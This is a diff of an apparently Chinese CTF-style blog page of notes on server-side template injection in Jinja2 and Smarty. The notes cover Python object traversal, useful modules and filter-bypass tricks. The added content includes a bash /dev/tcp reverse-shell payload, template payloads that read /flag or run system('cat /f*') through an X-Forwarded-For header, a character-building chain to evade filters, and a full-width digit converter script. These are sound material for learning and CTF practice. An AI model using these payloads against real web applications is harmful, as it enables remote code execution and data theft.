@@ -63,7 +63,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article" style="position: absolute; top: 40px; z-index: 2;">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">SSTI（服务器端模板注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-text">流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%ADSSTI%E7%B1%BB%E5%9E%8B"><span class="toc-text">判断SSTI类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%B1%BB"><span class="toc-text">常用类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#class"><span class="toc-text">__class__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bases"><span class="toc-text">__bases__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mro"><span class="toc-text">__mro__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subclasses"><span class="toc-text">__subclasses__()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals"><span class="toc-text">__globals__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init"><span class="toc-text">__init__</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="toc-text">可利用的模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#config"><span class="toc-text">config</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#os-popen"><span class="toc-text">os.popen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subprocess-Popen"><span class="toc-text">subprocess.Popen()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jinja2"><span class="toc-text">Jinja2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%87%BD%E6%95%B0lipsum"><span class="toc-text">全局函数lipsum</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">过滤绕过</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">SSTI（服务器端模板注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-text">流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%ADSSTI%E7%B1%BB%E5%9E%8B"><span class="toc-text">判断SSTI类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%B1%BB"><span class="toc-text">常用类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#class"><span class="toc-text">__class__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bases"><span class="toc-text">__bases__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mro"><span class="toc-text">__mro__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subclasses"><span class="toc-text">__subclasses__()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals"><span class="toc-text">__globals__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init"><span class="toc-text">__init__</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="toc-text">可利用的模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%BA%E6%9C%AC%E7%B1%BB"><span class="toc-text">获取基本类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#config"><span class="toc-text">config</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#request"><span class="toc-text">request</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9B%AE%E6%A0%87%E5%87%BD%E6%95%B0"><span class="toc-text">常用目标函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#os-popen"><span class="toc-text">os.popen()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subprocess-Popen"><span class="toc-text">subprocess.Popen()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E4%B8%AD%E9%97%B4%E5%AF%B9%E8%B1%A1"><span class="toc-text">常用中间对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jinja2"><span class="toc-text">Jinja2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%87%BD%E6%95%B0lipsum"><span class="toc-text">全局函数lipsum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set"><span class="toc-text">set</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">过滤绕过</span></a></li></ol></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -205,7 +205,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Web/" style="color: #ff7d73">Web</a>
+                <a href="/blog/tags/Web/" style="color: #00bcd4">Web</a>
             </span>
             
         </span>
@@ -267,15 +267,32 @@
 <h3 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h3><blockquote>
 <p>初始化类，返回类型是function</p>
 </blockquote>
-<h2 id="可利用的模块"><a href="#可利用的模块" class="headerlink" title="可利用的模块"></a>可利用的模块</h2><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><blockquote>
+<h2 id="可利用的模块"><a href="#可利用的模块" class="headerlink" title="可利用的模块"></a>可利用的模块</h2><h3 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h3><h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><blockquote>
 <p>获取当前设置</p>
 </blockquote>
 <p>如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag</p>
-<h3 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen()"></a>os.popen()</h3><blockquote>
+<h4 id="request"><a href="#request" class="headerlink" title="request"></a>request</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">request<span class="token punctuation">.</span>method <span class="token comment"># 请求方式</span>
+request<span class="token punctuation">.</span>form <span class="token comment"># 存放FormData中的数据 to_dict 序列化成字典</span>
+request<span class="token punctuation">.</span>args <span class="token comment"># 获取URL中的数据 to_dict 序列化成字典</span>
+request<span class="token punctuation">.</span>url <span class="token comment"># 访问的完整路径</span>
+request<span class="token punctuation">.</span>path <span class="token comment"># 路由地址</span>
+request<span class="token punctuation">.</span>host <span class="token comment"># 主机地址</span>
+request<span class="token punctuation">.</span>values <span class="token comment"># 获取 FormData and URL中的数据 不要用to_dict</span>
+request<span class="token punctuation">.</span>json  <span class="token comment"># 如果提交时请求头中的Content-Type:application/json 字典操作</span>
+request<span class="token punctuation">.</span>data  <span class="token comment"># 如果提交时请求头中的Content-Type 无法被识别 将请求体中的原始数据存放 byte</span>
+request<span class="token punctuation">.</span>cookies <span class="token comment"># 获取Cookie中的数据</span>
+request<span class="token punctuation">.</span>headers <span class="token comment"># 获取请求头</span>
+request<span class="token punctuation">.</span>files <span class="token comment"># 序列化文件存储 save()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>url_for</p>
+<p>get_flashed_messages</p>
+<p>self</p>
+<p>redirect</p>
+<h3 id="常用目标函数"><a href="#常用目标函数" class="headerlink" title="常用目标函数"></a>常用目标函数</h3><h4 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen()"></a>os.popen()</h4><blockquote>
 <p>返回一个<code>&lt;class ‘os._wrap_close’&gt;</code>对象，需要读取后才能处理</p>
 </blockquote>
 <p>需重定向<code>read()</code>才能得到str</p>
-<h3 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/liuyingying0418/article/details/100939697">subprocess.Popen()</a></h3><blockquote>
+<h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/liuyingying0418/article/details/100939697">subprocess.Popen()</a></h4><blockquote>
 <p>在python中实现多进程程序，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/andy0816/p/15624304.html">以此执行shell</a></p>
 </blockquote>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">subprocess</span><span class="token punctuation">.</span>Popen<span class="token punctuation">(</span> 
@@ -315,6 +332,15 @@
 </tr>
 </tbody></table>
 <p>使用<code>.communicate()</code>向stdin发送数据，或从stdout和stderr中读取数据</p>
+<p>file</p>
+<p>exec</p>
+<p>eval</p>
+<h3 id="常用中间对象"><a href="#常用中间对象" class="headerlink" title="常用中间对象"></a>常用中间对象</h3><pre class="line-numbers language-django" data-language="django"><code class="language-django">catch_warnings.__init__.func_globals.linecache.os.popen('bash -i >&amp; /dev/tcp/127.0.0.1/233 0>&amp;1')
+lipsum.__globals__.__builtins__.open("/flag").read()
+linecache.os.system('ls')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
 <hr>
 <h2 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h2><p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/">官方文档</a></p>
 <h3 id="全局函数lipsum"><a href="#全局函数lipsum" class="headerlink" title="全局函数lipsum"></a>全局函数lipsum</h3><blockquote>
@@ -333,8 +359,9 @@
 
 <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"命令"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
+<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><blockquote>
+<p>定义变量，只要定义了这个变量，在后面的代码中都可以使用此变量</p>
+</blockquote>
 <h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p><code>X-Forwarded-For:&#123;if system(&#39;cat /f*&#39;)&#125;&#123;/if&#125;</code></p>
 <h2 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h2><p><strong>引号</strong>：get传参绕过</p>
 <p>在shell中使用<code>request.args.a</code>或<code>request.form.a</code>或<code>request.values.a</code>，然后<code>&amp;a=命令</code></p>
@@ -347,14 +374,62 @@
 <blockquote>
 <p>实例对象通过[]运算符取值时，会调用它的方法__getitem__</p>
 </blockquote>
-<p><code>&#123;&#123;&#125;&#125;</code>：<code>&#123;%print+要执行的语句%&#125;</code></p>
-<p><strong>传参request</strong>：用<code>~</code>拼接命令</p>
-<pre class="line-numbers language-django" data-language="django"><code class="language-django">(()|select|string)[0]
-数组内填ASCll码构造字符
+<p><code>&#123;&#123;&#125;&#125;</code>：引用变量，执行函数</p>
+<p>​			可用<code>&#123;%print+要执行的语句%&#125;</code>替换：逻辑代码</p>
+<p><strong>传参request</strong>：用<code>~</code>拼接命令，使用<code>set</code>定义变量拼接</p>
+<pre class="line-numbers language-django" data-language="django"><code class="language-django">(()|select|string|list)
+查看可利用的字符(后几位是地址会随机变化)
+>>> ['<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>',</span> <span class="token attr-name">'g',</span> <span class="token attr-name">'e',</span> <span class="token attr-name">'n',</span> <span class="token attr-name">'e',</span> <span class="token attr-name">'r',</span> <span class="token attr-name">'a',</span> <span class="token attr-name">'t',</span> <span class="token attr-name">'o',</span> <span class="token attr-name">'r',</span> <span class="token attr-name">'</span> <span class="token attr-name">',</span> <span class="token attr-name">'o',</span> <span class="token attr-name">'b',</span> <span class="token attr-name">'j',</span> <span class="token attr-name">'e',</span> <span class="token attr-name">'c',</span> <span class="token attr-name">'t',</span> <span class="token attr-name">'</span> <span class="token attr-name">',</span> <span class="token attr-name">'s',</span> <span class="token attr-name">'e',</span> <span class="token attr-name">'l',</span> <span class="token attr-name">'e',</span> <span class="token attr-name">'c',</span> <span class="token attr-name">'t',</span> <span class="token attr-name">'_',</span> <span class="token attr-name">'o',</span> <span class="token attr-name">'r',</span> <span class="token attr-name">'_',</span> <span class="token attr-name">'r',</span> <span class="token attr-name">'e',</span> <span class="token attr-name">'j',</span> <span class="token attr-name">'e',</span> <span class="token attr-name">'c',</span> <span class="token attr-name">'t',</span> <span class="token attr-name">'</span> <span class="token attr-name">',</span> <span class="token attr-name">'a',</span> <span class="token attr-name">'t',</span> <span class="token attr-name">'</span> <span class="token attr-name">',</span> <span class="token attr-name">'0',</span> <span class="token attr-name">'x',</span> <span class="token attr-name">'7',</span> <span class="token attr-name">'f',</span> <span class="token attr-name">'7',</span> <span class="token attr-name">'7',</span> <span class="token attr-name">'a',</span> <span class="token attr-name">'d',</span> <span class="token attr-name">'9',</span> <span class="token attr-name">'e',</span> <span class="token attr-name">'b',</span> <span class="token attr-name">'d',</span> <span class="token attr-name">'d',</span> <span class="token attr-name">'0',</span> <span class="token attr-name">'</span><span class="token punctuation">></span></span>']
+
+(()|select|string)[0]
+数组内选择可使用的字符
 
 (()|select|string|list).pop(0)
-适用于没有中括号的情况<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+适用于没有中括号的情况<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>payload</p>
+<pre class="line-numbers language-django" data-language="django"><code class="language-django"><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">a</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">select</span><span class="token operator">|</span><span class="token filter function">string</span><span class="token operator">|</span><span class="token filter function">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token delimiter punctuation">%&#125;</span></span>    // a = _
+<span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">globals</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">globals</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span> <span class="token delimiter punctuation">%&#125;</span></span>	// globals=__globals__
+<span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">init</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">init</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span> <span class="token delimiter punctuation">%&#125;</span></span>		//init=__init__
+<span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">builtins</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">builtins</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span> <span class="token delimiter punctuation">%&#125;</span></span>		//builtins=__builtins__
+<span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">a</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">lipsum</span><span class="token operator">|</span><span class="token filter function">attr</span><span class="token punctuation">(</span><span class="token variable">globals</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">builtins</span><span class="token punctuation">)</span> <span class="token delimiter punctuation">%&#125;</span></span>	//lipsum.__globals__.__builtins__
+<span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">chr</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">.</span><span class="token variable">chr</span> <span class="token delimiter punctuation">%&#125;</span></span>		//调用chr()函数
+<span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">print</span> <span class="token variable">a</span><span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">~</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token operator">~</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token operator">~</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">~</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token delimiter punctuation">%&#125;</span></span>	
+//构造<span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span><span class="token tag keyword">print</span> <span class="token punctuation">(</span><span class="token variable">lipsum</span><span class="token punctuation">.</span><span class="token variable">__globals__</span><span class="token punctuation">.</span><span class="token variable">__builtins__</span><span class="token punctuation">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter punctuation">%&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><strong>数字</strong>：</p>
+<p>使用<code>count</code>或<code>length</code>获取数字</p>
+<pre class="line-numbers language-django" data-language="django"><code class="language-django"><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">one</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">a</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token operator">|</span><span class="token filter function">length</span><span class="token punctuation">)</span><span class="token delimiter punctuation">%&#125;</span></span>
+>>>  one = 1
+<span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">two</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">aa</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token operator">|</span><span class="token filter function">length</span><span class="token punctuation">)</span><span class="token delimiter punctuation">%&#125;</span></span>
+>>>  two = 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>使用全角数字代替半角数字</p>
+<p>相关脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">half2full</span><span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    full <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> ch <span class="token keyword">in</span> half<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xfee0</span><span class="token punctuation">)</span>
+        <span class="token keyword">elif</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>
+            ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+        full <span class="token operator">+=</span> ch
+    <span class="token keyword">return</span> full
+<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+    t <span class="token operator">=</span> <span class="token string">''</span>
+    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入想要转换的数字字符串："</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
+        t <span class="token operator">+=</span> half2full<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><strong>print</strong></p>
+<p>dnslog带外</p>
 
     </div>
     
